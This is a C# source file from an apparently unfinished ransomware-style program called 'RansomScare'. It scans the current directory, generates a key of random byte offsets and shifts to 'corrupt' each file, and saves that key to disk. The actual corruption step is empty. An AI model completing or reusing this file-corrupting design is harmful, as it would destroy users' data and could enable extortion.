using System;
using System.Collections.Generic;
using System.Dynamic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RansomScare
{
    internal class Cryptography
    {
        public void EncryptFiles()
        {
            // Generate and save key
            GenerateKey();

            // Retrieve saved key
            string key = RetrieveKey();
            
            // Get list of suitable files in directory
            List <string> files = ScanFiles();

            // Encrypt files
            for(int i  = 0; i < files.Count; i++)
            {
                EncryptFile(files[i], key);
            }
        }

        // Directory file scan function
        // returns list of all files in the directory, excluding RansomScare's own
        private List<string> ScanFiles()
        {

            string directory = Directory.GetCurrentDirectory();

            // Get file names
            List <string> files = new List<string>(Directory.GetFiles(directory));

            // Remove 'key' and executable to prevent encrypting them
            files.Remove(directory + "\\key");
            files.Remove(directory + "\\RansomScare.exe");

            // Exclude .pdb and .exe.config for debug
            files.Remove(directory + "\\RansomScare.exe.config");
            files.Remove(directory + "\\RansomScare.pdb");

            return files;
        }

        // Generates and saves key
        // the key is comprised of two components: targets and shifts
        // targets indicate which bytes of a file to alter
        // shifts are numbers to be added to the target bytes to corrupt the file
        private void GenerateKey()
        {
            
            // File size in bytes
            int fileSize = 1024;

            // Random object
            Random random = new Random();

            // List of bytes to target
            List<int> targets = new List<int>();

            for(int i = 0; i < (fileSize / 10); i++)
            {
                int target = random.Next(fileSize);
                targets.Add(target);
            }

            // Shifts amount for target bytes
            List<int> shifts = new List<int>();

            for (int i = 0; i < targets.Count; i++)
            {
                int shift = random.Next(255); // 255 is maximum byte value
                shifts.Add(shift);
            }

            // Format targets and shifts into one key
            string key = "";

            for(int i = 0;i < targets.Count;i++)
            {
                key += targets[i].ToString() + "-" + shifts[i].ToString() + "/";
            }

            // Save key to file
            File.WriteAllText(Directory.GetCurrentDirectory() + "/key", key);

        }

        private string RetrieveKey()
        {
            return File.ReadAllText(Directory.GetCurrentDirectory() + "/key");
        }

        private void EncryptFile(string file, string key)
        {
            // Creates byte array from file
            byte[] bytes = File.ReadAllBytes(file);
        }

        // List printing function for debug
        private void printList(List<string> list) {
            string output = "[";
            for (int i = 0; i < list.Count; i++)
            {
                output += list[i] + ", ";
            }

            // Remove final ', ' if list not empty
            if (list.Count > 0)
            {
                output = output.Substring(0, output.Length - 2);
            }
            
            Console.WriteLine(output + "]");
        }
    }
}
